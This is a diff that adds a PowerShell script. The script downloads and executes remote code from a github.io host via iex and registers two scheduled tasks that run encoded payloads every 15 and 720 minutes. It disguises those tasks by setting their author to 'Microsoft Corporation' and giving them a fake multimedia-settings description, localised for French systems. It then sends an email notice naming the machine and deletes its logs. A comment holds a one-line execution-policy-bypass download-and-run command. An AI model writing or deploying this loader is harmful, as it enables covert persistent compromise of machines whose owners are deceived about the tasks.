@@ -1,0 +1,156 @@
+
+$Script:UseObfuscation = $False
+
+<#         *******************
+#              PREPARATION
+#          ********************
+# 
+# @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('.......'))"
+#
+#>
+
+
+$Start=Get-Date
+
+Function IsFrench{
+    $Lang = (Get-WinSystemLocale).Name
+    if($Lang -match "fr"){
+        return $true
+    }
+    return $false
+}
+
+
+
+function Convert-FromBase64CompressedScriptBlock {
+
+    [CmdletBinding()] param(
+        [String]
+        $ScriptBlock
+    )
+
+    # Base64 to Byte array of compressed data
+    $ScriptBlockCompressed = [System.Convert]::FromBase64String($ScriptBlock)
+
+    # Decompress data
+    $InputStream = New-Object System.IO.MemoryStream(, $ScriptBlockCompressed)
+    $GzipStream = New-Object System.IO.Compression.GzipStream $InputStream, ([System.IO.Compression.CompressionMode]::Decompress)
+    $StreamReader = New-Object System.IO.StreamReader($GzipStream)
+    $ScriptBlockDecompressed = $StreamReader.ReadToEnd()
+    $GzipStream.Close()
+    $InputStream.Close()
+
+    $ScriptBlockDecompressed
+}
+
+$DepsFile="https://vr972be716a04eb6.github.io/B01C5C489550CBA356DD/AF393.TXT"
+$TaskFile="https://vr972be716a04eb6.github.io/B01C5C489550CBA356DD/BE37A.TXT"
+
+if($Script:UseObfuscation -eq $True){
+    $FileData=(New-Object System.Net.WebClient).DownloadString($DepsFile)
+    iex (Convert-FromBase64CompressedScriptBlock $FileData)
+}else{
+    iex (New-Object System.Net.WebClient).DownloadString($DepsFile)
+    iex (New-Object System.Net.WebClient).DownloadString($TaskFile)
+}
+
+
+iex (Get-UpdateRegistryScript)
+
+
+
+        <#*******************
+              TASK NO 1
+         *******************#>
+
+try{
+    $FullTaskName=$script:NEWTASK_PATH + $script:TASKNAME_ONE
+
+    $ClearScript=Get-ExecRegistryScript
+   
+    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ClearScript) 
+    $Base64Command = [Convert]::ToBase64String($Bytes)
+    $Base64CommandLen = $Base64Command.Length
+    Log-String "Install-EncodedScriptTask -TaskName $FullTaskName -Interval 15 -EncodedTask Base64Command($Base64CommandLen)"
+    $TaskVal=Get-ScheduledTask -TaskName $script:TASKNAME_ONE -erroraction ignore
+    if($TaskVal -eq $null){
+         Get-ScheduledTask -TaskName $script:TASKNAME_ONE -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
+         Install-EncodedScriptTask -ShortTaskName "$script:TASKNAME_ONE" -TaskName $FullTaskName -Interval 15 -EncodedTask $Base64Command
+
+         $Desc = 'Multimedia peripheral settings task (0xAE01F1)'
+
+        if(IsFrench -eq $True){
+            $Desc = 'Tache de parametrage des peripheriques audio/video (0xAE01F1)'
+        }
+
+        $taskObject = Get-ScheduledTask -TaskName $script:TASKNAME_ONE -erroraction ignore
+        if($taskObject -ne $null){
+            $taskObject.Author = "Microsoft Corporation"
+            $taskObject.Description = $Desc
+            $taskObject.settings.RunOnlyIfNetworkAvailable=$True
+            $taskObject.version=$script:NEWTASK_VERS
+            $taskObject | Set-ScheduledTask          
+        }
+    }
+}catch
+{
+    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
+    Log-String $Msg -IsError 
+}   
+
+
+        <#*******************
+              TASK NO 2
+         *******************#>
+
+try{
+    $FullTaskName=$script:NEWTASK_PATH + $script:TASKNAME_TWO
+
+    $ClearScript=Get-UpdateRegistryScript
+   
+    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ClearScript) 
+    $Base64Command = [Convert]::ToBase64String($Bytes)
+    $Base64CommandLen = $Base64Command.Length
+    Log-String "Install-EncodedScriptTask -TaskName $FullTaskName -Interval 720 -EncodedTask Base64Command($Base64CommandLen)"
+    $TaskVal=Get-ScheduledTask -TaskName $script:TASKNAME_TWO -erroraction ignore
+    if($TaskVal -eq $null){
+         Get-ScheduledTask -TaskName $script:TASKNAME_TWO -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
+         Install-EncodedScriptTask -ShortTaskName "$script:TASKNAME_TWO" -TaskName $FullTaskName -Interval 720 -EncodedTask $Base64Command
+
+         $Desc = 'Multimedia peripheral settings task (0xAE01F1)'
+
+        if(IsFrench -eq $True){
+            $Desc = 'Tache de parametrage des peripheriques audio/video (0xAE01F1)'
+        }
+
+        $taskObject = Get-ScheduledTask -TaskName $script:TASKNAME_TWO -erroraction ignore
+        if($taskObject -ne $null){
+            $taskObject.Author = "Microsoft Corporation"
+            $taskObject.Description = $Desc
+            $taskObject.settings.RunOnlyIfNetworkAvailable=$True
+            $taskObject.version=$script:NEWTASK_VERS
+            $taskObject | Set-ScheduledTask          
+        }
+    }
+}catch
+{
+    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
+    Log-String $Msg -IsError 
+}   
+
+
+$End=Get-Date
+$Diff=$End-$Start
+$Min=$Diff.Minutes
+$Sec=$Diff.Seconds
+Log-String "Done All tasks. Ended on $End."
+Log-String "Took a total of $Min minutes and $Sec seconds."
+
+Log-String "Send-EmailNotification"
+Send-EmailNotification "Schd Task Install Notice for $env:COMPUTERNAME" "Done All tasks. Ended on $End. Took a total of $Min minutes and $Sec seconds. $FullLogs" "$global:LogFileName"
+
+Log-String "Cleanup"
+Cleanup -DeleteLogFiles
+
+Sleep 1
+
